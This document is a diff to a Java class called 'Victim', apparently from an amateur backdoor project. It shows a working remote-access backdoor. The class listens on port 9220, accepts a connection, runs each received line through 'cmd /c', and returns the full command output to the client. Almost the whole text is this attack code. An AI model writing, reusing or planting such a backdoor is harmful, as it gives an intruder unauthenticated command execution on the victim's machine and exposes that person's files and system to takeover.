@@ -18,14 +18,12 @@ public class Victim extends Thread{
 
     public Victim()
     {
+        client=null;
         try
         {
-            client=null;
-            while(client==null)
-            {
-                client=socket.accept();
-            }
+
             socket=new ServerSocket(9220);
+            client=socket.accept();
             in=new BufferedReader(new InputStreamReader(client.getInputStream()));
             out = new PrintWriter(client.getOutputStream(), true);
         }
@@ -33,28 +31,39 @@ public class Victim extends Thread{
         {
 
         }
+        System.out.println("Connesso");
+        System.out.println(client.getInetAddress());
 
     }
 
     public void run()
     {
         String msg=null;
-
+        String finale="";
         while(msg!="BackDoorClose")
         {
-            try
-            {
-                msg=in.readLine();
-
-                if(msg==null || msg=="BackDoorClose")
-                {
-                    msg="BackDoorClose";
+            try {
+                msg = in.readLine();
+                System.out.println("messaggio " + msg);
+                if (msg == null || msg == "BackDoorClose") {
+                    msg = "BackDoorClose";
                 }
-                p=Runtime.getRuntime().exec(msg);
-                BufferedReader commadOutput=new BufferedReader(new InputStreamReader(p.getInputStream()));
-                String resault= commadOutput.readLine();
-                out.println(resault);
-            }
+                p = Runtime.getRuntime().exec("cmd /c "+msg);
+
+                p.waitFor();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(
+                        p.getInputStream()));
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    System.out.println(line);
+                    finale+=line+"\n";
+
+                    }
+
+
+                out.println(finale);
+                finale="";
+                }
             catch(Exception e)
             {
 
